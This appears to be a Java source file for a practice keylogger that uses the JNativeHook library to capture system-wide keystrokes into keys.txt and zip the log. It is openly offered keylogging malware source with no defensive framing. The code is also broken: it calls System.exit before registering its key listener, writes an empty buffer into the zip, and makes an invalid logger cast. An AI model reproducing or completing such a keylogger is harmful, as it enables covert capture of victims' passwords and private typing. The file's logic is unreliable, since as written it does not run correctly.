package KeyLogger;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import org.junit.platform.commons.logging.LoggerFactory;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class Key implements NativeKeyListener {
    private static final Path file = Paths.get("keys.txt");
    private static final Logger logger = (Logger) LoggerFactory.getLogger(Key.class);

    public Key() {}

    public static void main(String[] args) throws NativeHookException, IOException {
        String fileName = "C:\\Users\\12\\IdeaProjects\\TrainingJava\\keys.txt";
        ZipOutputStream zip = new ZipOutputStream(new FileOutputStream("C:\\Users\\12" +
                "\\IdeaProjects" +
                "\\TrainingJava\\output.zip"));
        FileInputStream fis = new FileInputStream(fileName);
        ZipEntry entry = new ZipEntry("keys.txt");
        logger.info("\"Key logger has been started\"");
        zip.putNextEntry(entry);
        byte[] buffer = new byte[fis.available()];
        zip.write(buffer);
        zip.closeEntry();

        init();


        GlobalScreen.registerNativeHook();
        System.exit(-1);
        GlobalScreen.addNativeKeyListener(new Key());
    }
    private static void init() {
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.WARNING);
        logger.setUseParentHandlers(false);
    }
    public void nativeKeyPressed(NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());

        try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE,
                StandardOpenOption.WRITE,
                StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {

            if (keyText.length() > 1) {
                writer.print("[" + keyText + "]");
            } else {
                writer.print(keyText);
            }

        } catch (IOException ex) {
            logger.exiting(ex.getMessage(), String.valueOf(ex));
            System.exit(-1);
        }
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
        // Nothing
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
        // Nothing here
    }
}

